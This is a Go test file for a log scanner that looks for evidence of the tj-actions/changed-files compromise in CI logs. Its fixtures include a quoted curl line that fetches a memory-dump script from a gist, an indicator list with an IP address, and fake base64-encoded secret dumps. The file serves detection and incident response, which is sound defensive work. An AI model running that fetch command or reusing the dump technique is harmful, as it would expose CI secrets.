package logscan

import (
	"archive/zip"
	"encoding/base64"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// fakeDump builds what the tj-actions payload printed: a Runner.Worker memory
// excerpt holding secret entries, base64-encoded twice. The values here are
// fake and the test asserts they never come back out.
func fakeDump(twice bool) string {
	raw := `junk{"GH_PAT":{"value":"ghp_FAKEVALUE123","isSecret":true}}more` +
		`{"AWS_SECRET":{"value":"a\"quoted\"value","isSecret":true}}` +
		`{"NOT_SECRET":{"value":"x","isSecret":false}}` + strings.Repeat("padding", 20)
	once := base64.StdEncoding.EncodeToString([]byte(raw))
	if !twice {
		return once
	}
	return base64.StdEncoding.EncodeToString([]byte(once))
}

const sha = "0e58ed8671d6b60d0890c21b07f8835ace038e67"

func sampleLog(dump string) string {
	return strings.Join([]string{
		"2025-03-14T16:00:00.0000000Z Download action repository 'actions/checkout@v4' (SHA:11BD71901BBE5B1630CEEA73D27597364C9AF683)",
		"2025-03-14T16:00:01.0000000Z Download action repository 'tj-actions/changed-files@v45' (SHA:" + sha + ")",
		"2025-03-14T16:00:05.0000000Z curl -sSf https://gist.githubusercontent.com/nikitastupin/x/raw/memdump.py",
		"2025-03-14T16:00:06.0000000Z " + dump,
		"2025-03-14T16:00:07.0000000Z done",
	}, "\n")
}

func TestScanReaderFindsEverything(t *testing.T) {
	for _, twice := range []bool{true, false} {
		ev, err := ScanReader("job/1_setup.txt", strings.NewReader(sampleLog(fakeDump(twice))), []string{"gist.githubusercontent.com/nikitastupin", "91.214.78.178"})
		if err != nil {
			t.Fatal(err)
		}
		if len(ev.Downloads) != 2 || ev.Downloads[1].SHA != sha || ev.Downloads[0].SHA != strings.ToLower("11BD71901BBE5B1630CEEA73D27597364C9AF683") {
			t.Errorf("downloads = %+v", ev.Downloads)
		}
		if len(ev.Hits) != 1 || ev.Hits[0].Line != 3 {
			t.Errorf("hits = %+v", ev.Hits)
		}
		if got := strings.Join(ev.LeakedSecrets, ","); got != "AWS_SECRET,GH_PAT" {
			t.Errorf("twice=%v leaked = %q, want AWS_SECRET,GH_PAT (isSecret:false excluded)", twice, got)
		}
	}
}

func TestNoFalsePositives(t *testing.T) {
	// Long base64 that is not a dump (e.g. a certificate or a cache key) must
	// not be reported.
	blob := base64.StdEncoding.EncodeToString([]byte(strings.Repeat("hello world, nothing to see. ", 20)))
	ev, err := ScanReader("x.txt", strings.NewReader("line "+blob+"\nnot base64 !!!"+strings.Repeat("=", 100)), nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(ev.LeakedSecrets) != 0 || len(ev.Downloads) != 0 || len(ev.Hits) != 0 {
		t.Errorf("want nothing, got %+v", ev)
	}
}

func TestScanZipNeverReturnsValues(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "logs.zip")
	f, err := os.Create(p)
	if err != nil {
		t.Fatal(err)
	}
	zw := zip.NewWriter(f)
	w, _ := zw.Create("build/3_Get changed files.txt")
	w.Write([]byte(sampleLog(fakeDump(true))))
	zw.Create("build/") // directory entry
	w2, _ := zw.Create("lint/1_Set up job.txt")
	w2.Write([]byte("nothing here\n"))
	zw.Close()
	f.Close()

	ev, err := ScanZip(p, []string{"memdump.py"})
	if err != nil {
		t.Fatal(err)
	}
	if len(ev.DumpFiles) != 1 || ev.DumpFiles[0] != "build/3_Get changed files.txt" {
		t.Errorf("dump files = %v", ev.DumpFiles)
	}
	all := strings.Join(ev.LeakedSecrets, " ") + strings.Join(ev.DumpFiles, " ")
	for _, h := range ev.Hits {
		all += h.Indicator + h.File
	}
	if strings.Contains(all, "ghp_FAKEVALUE123") || strings.Contains(all, "quoted") {
		t.Fatal("a secret VALUE leaked into the evidence")
	}
}

func TestScanZipErrors(t *testing.T) {
	if _, err := ScanZip(filepath.Join(t.TempDir(), "missing.zip"), nil); err == nil {
		t.Error("want error for missing archive")
	}
	bad := filepath.Join(t.TempDir(), "bad.zip")
	os.WriteFile(bad, []byte("not a zip"), 0o600)
	if _, err := ScanZip(bad, nil); err == nil {
		t.Error("want error for corrupt archive")
	}
}

func TestLineTooLongIsReportedNotHidden(t *testing.T) {
	big := strings.Repeat("a", maxLine+10)
	if _, err := ScanReader("x", strings.NewReader(big), nil); err == nil || !strings.Contains(err.Error(), "not scanned") {
		t.Errorf("want a not-scanned error, got %v", err)
	}
}
